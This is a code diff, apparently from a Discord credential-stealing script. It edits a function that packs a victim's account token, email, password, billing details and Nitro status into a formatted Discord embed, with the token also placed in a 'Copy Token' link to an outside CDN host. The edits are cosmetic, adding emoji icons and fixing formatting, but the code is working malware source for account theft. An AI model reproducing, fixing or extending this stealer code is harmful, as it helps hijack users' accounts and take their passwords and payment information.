@@ -296,13 +296,13 @@ const getBadges = (flags) => {
       badges += "Early Supporter, ";
       break;
     case 128:
-      badges += "<:Brilance:964601963293573120>  HypeSquad Brillance, ";
+      badges += "<:Brilance:964601963293573120>";
       break;
     case 64:
-      badges += "<:Hypesquat4:964601933442744340>  HypeSquad Bravery, ";
+      badges += "<:Hypesquat4:964601933442744340>";
       break;
     case 256:
-      badges += "<:HypeSquat1:964601904481046619>  HypeSquad Balance, ";
+      badges += "<:HypeSquat1:964601904481046619>";
       break;
     case 0:
       badges = "None";
@@ -336,39 +336,39 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
        {
-            name: `\`${token}\``,
-            value: `Copy Token [Copy Token](https://superfurrycdn.nl/copy/${token}`,
+            name: `<a:tre:962470429115686923>  \`${token}\``,
+            value: `Copy Token [Copy Token](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
            {
-            name: "Badges:",
+            name: "<:tre:966388018527219753>  Badges:",
             value: `**${badges}**`,
             inline: true,
           },
           {
-            name: "Nitro Type:",
-            value: `\`${nitro}\``,
+            name: "<:tre:962761278764490772>  Nitro Type:",
+            value: `${nitro}`,
             inline: true,
           },
           {
-            name: "Billing:",
+            name: "<a:tre:962470727129391134> Billing:",
             value: `\`${billing}\``,
             inline: true,
           },
           {
-            name: "Email::",
+            name: "<:tre:962472209308340315> Email:",
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: "Password::",
+            name: "<a:tre:962470942796288090> Password:",
             value: `\`${password}\``,
             inline: true,
           },
         ],
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.discordapp.com/attachments/962469503206322249/965639587894546482/115268.gif`,
         },
         footer: {
           text: "xd",
